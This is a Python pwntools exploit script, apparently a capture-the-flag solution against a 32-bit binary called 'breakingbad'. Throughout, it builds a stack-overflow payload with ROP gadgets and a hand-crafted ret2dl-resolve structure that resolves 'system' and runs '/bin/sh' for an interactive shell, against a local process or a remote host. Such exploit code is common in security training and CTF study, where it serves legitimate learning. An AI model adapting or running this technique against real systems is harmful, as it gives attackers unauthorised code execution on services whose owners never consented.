#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from roputils import ROP 
import os, sys

# switches
DEBUG = 1 

# modify this
if DEBUG:
    io = process('./breakingbad')
    binary = ELF('./breakingbad')

else:
    io = remote(sys.argv[1], int(sys.argv[2]))

context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here

puts_plt = 0x8048410
puts_got = 0x804a01c
main_addr = 0x80486dd
pop_ret = 0x080483b5
printf_got = 0x804a010
read_got = 0x804a00c
read_plt = 0x80483d0
bss = 0x804a210
pppr = 0x0804880d
data_addr = 0x804a040
# define exploit function here
def dl_resolve_data(r, base, name):
	jmprel = r.dynamic('JMPREL')
	relent = r.dynamic('RELENT')
	symtab = r.dynamic('SYMTAB')
	syment = r.dynamic('SYMENT')
	strtab = r.dynamic('STRTAB')
	versym = r.dynamic('VERSYM')
	
	addr_reloc, padlen_reloc = r.align(base, jmprel, relent)
	addr_sym, padlen_sym = r.align(addr_reloc+relent, symtab, syment)
	index_sym = ((addr_sym - symtab) / syment)
	ver_addr = versym + index_sym * 2

	ndx = binary.read(ver_addr, 2)
	while ndx != '\x00\x00':
		index_sym += 1
		ver_addr = versym + index_sym * 2
		ndx = binary.read(ver_addr, 2)
	
	padlen_sym += index_sym * 0x10 - (addr_sym - symtab) 
	addr_sym = index_sym * 0x10 + symtab 
	addr_symstr = addr_sym + syment
	r_info = (index_sym << 8) | 0x7	
	st_name = addr_symstr - strtab

	buf = r.fill(padlen_reloc)
	buf += struct.pack('<II', base, r_info) 
	buf += r.fill(padlen_sym)
	buf += struct.pack('<IIII', st_name, 0, 0, 0x12) 
	buf += r.string(name)
	
	return buf

def pwn():
	rop = ROP('./breakingbad')
	ru('name:')
	pay = 'A' * 12
	pay += p32(read_plt) + p32(pppr) + p32(0) + p32(data_addr) + p32(0x600) 
	pay += rop.dl_resolve_call(data_addr + 16, data_addr) 
	sn(pay)
	
	ru(':')
	payload2 = (
    	'Methamphetamine',
    	p32(0xffff),
    	'A'*179,
    	'B'*4
	) 
	sn(''.join(payload2))
	
	io.recv()
	
	pay = rop.string('/bin/sh')
	pay += rop.fill(16, pay)
	pay += dl_resolve_data(rop, data_addr + 16, 'system')
	sn(pay)	
	io.interactive()
	return

if __name__ == '__main__':
    pause()
    pwn()
